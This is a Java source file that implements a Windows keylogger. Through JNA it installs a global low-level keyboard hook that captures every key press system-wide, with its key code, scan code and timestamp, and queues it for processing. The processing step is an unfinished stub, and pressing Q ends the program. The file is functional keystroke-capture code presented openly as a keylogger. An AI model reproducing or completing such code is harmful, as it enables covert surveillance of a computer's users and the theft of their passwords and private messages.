package uk.co.baconi.keylogger.framework.impl;

import com.sun.jna.Platform;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinDef.HMODULE;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.HHOOK;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;
import com.sun.jna.platform.win32.WinUser.MSG;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import uk.co.baconi.keylogger.framework.constants.Numbers;
import uk.co.baconi.keylogger.framework.impl.WindowsKeyLogger.WindowsKeyResult;
import uk.co.baconi.keylogger.framework.interfaces.KeyLogger;

import java.util.concurrent.BlockingQueue;

public final class WindowsKeyLogger extends AbstractImpl<WindowsKeyResult> implements KeyLogger {
    private static final String LOG_ERROR_MSG = "This key logger implementation should only be used on a Windows OS.";
    private static final String EXCEPTION_ERROR_MSG = "This key logger implementation only supports Windows.";

    private static final Logger LOG = LogManager.getLogger();

    private static volatile boolean quit;
    private final HHOOK hhk;

    private WindowsKeyLogger() {
        super();

        if (!Platform.isWindows()) {
            LOG.error(LOG_ERROR_MSG);
            throw new RuntimeException(EXCEPTION_ERROR_MSG);
        }
        final HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        final LowLevelKeyoardProcImpl keyboardHook = new LowLevelKeyoardProcImpl(this);
        hhk = User32.INSTANCE.SetWindowsHookEx(WinUser.WH_KEYBOARD_LL, keyboardHook, hMod, Numbers.ZERO);
    }

    @Override
    public void startLogging() {
        new Thread() {
            @Override
            public void run() {
                while (!quit) {
                    try {
                        Thread.sleep(Numbers.TEN);
                    } catch (final Throwable t) {
                        LOG.error(t.getClass().getName(), t);
                    }
                }
                User32.INSTANCE.UnhookWindowsHookEx(hhk);
                System.exit(Numbers.ZERO);
            }
        }.start();

        int result;
        final MSG msg = new MSG();

        while ((result = User32.INSTANCE.GetMessage(msg, null, Numbers.ZERO, Numbers.ZERO)) != Numbers.ZERO) {
            if (result == Numbers.MINUS_ONE) {
                break;
            } else {
                User32.INSTANCE.TranslateMessage(msg);
                User32.INSTANCE.DispatchMessage(msg);
            }
        }

        User32.INSTANCE.UnhookWindowsHookEx(hhk);
    }

    @Override
    protected void processResults(final BlockingQueue<WindowsKeyResult> processQueue) {
        // TODO Auto-generated method stub
    }

    private HHOOK getHHOOK() {
        return hhk;
    }

    private void quit() {
        quit = true;
    }

    private static final class LowLevelKeyoardProcImpl implements LowLevelKeyboardProc {
        private static final int QUITE_KEY_CODE = 81;

        private final WindowsKeyLogger parent;

        public LowLevelKeyoardProcImpl(final WindowsKeyLogger parent) {
            this.parent = parent;
        }

        @Override
        public LRESULT callback(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
            if (nCode >= 0) {
                if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                    try {
                        parent.addToProcessQueue(new WindowsKeyResult(nCode, wParam, info));
                    } catch (final InterruptedException e) {
                        LOG.error(e.getClass().getName(), e);
                    }

                    if (info.vkCode == QUITE_KEY_CODE) {
                        parent.quit();
                    }
                }
            }
            return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, new WinDef.LPARAM(Pointer.nativeValue(info.getPointer())));
        }
    }

    protected static final class WindowsKeyResult {
        private final int nCode;
        private final int wParam;
        private final int vkCode;
        private final int scanCode;
        private final int flags;
        private final int time;
        private final long dwExtraInfo;

        private WindowsKeyResult(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
            this.nCode = nCode;
            this.wParam = wParam.intValue();
            dwExtraInfo = info.dwExtraInfo.longValue();
            flags = info.flags;
            scanCode = info.scanCode;
            time = info.time;
            vkCode = info.vkCode;
        }

        public int getnCode() {
            return nCode;
        }

        public int getwParam() {
            return wParam;
        }

        public int getVkCode() {
            return vkCode;
        }

        public int getScanCode() {
            return scanCode;
        }

        public int getFlags() {
            return flags;
        }

        public int getTime() {
            return time;
        }

        public long getDwExtraInfo() {
            return dwExtraInfo;
        }
    }
}
